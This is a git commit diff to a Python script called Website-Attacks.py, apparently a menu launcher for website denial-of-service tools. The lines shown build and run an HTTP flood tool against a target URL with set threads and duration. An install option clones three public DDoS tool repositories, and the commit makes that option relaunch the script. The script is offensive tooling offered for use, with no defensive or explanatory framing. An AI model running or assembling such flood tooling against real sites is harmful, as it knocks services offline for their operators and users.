398572433857221ff2574adc84d0bace34b9794f
Rebrithed-Reaperr <85047722+Rebrithed-Reaperr@users.noreply.github.com>
2021-06-09 20:29:33 -0500

    Update Website-Attacks.py

--- Website-Attacks.py
+++ Website-Attacks.py
@@ -22,7 +22,7 @@ elif cyber == '03' or cyber == '3':
 	os.system(' cd golang-httpflood && go build httpflood.go && ./httpflood <url> <threads> <get/post> <seconds> <header.txt/nil> ')
 
 elif cyber == '04' or cyber == '4':
-	os.system(' git clone https://github.com/palahsu/DDoS-Ripper && git clone https://github.com/MusH4ck007/Layer-7-Attack && git clone https://github.com/Leeon123/golang-httpflood ')
+	os.system(' git clone https://github.com/palahsu/DDoS-Ripper && git clone https://github.com/MusH4ck007/Layer-7-Attack && git clone https://github.com/Leeon123/golang-httpflood && python2 Website-Attacks.py ')
 
 elif cyber == '00' or cyber == '0':
 	sys.exit()
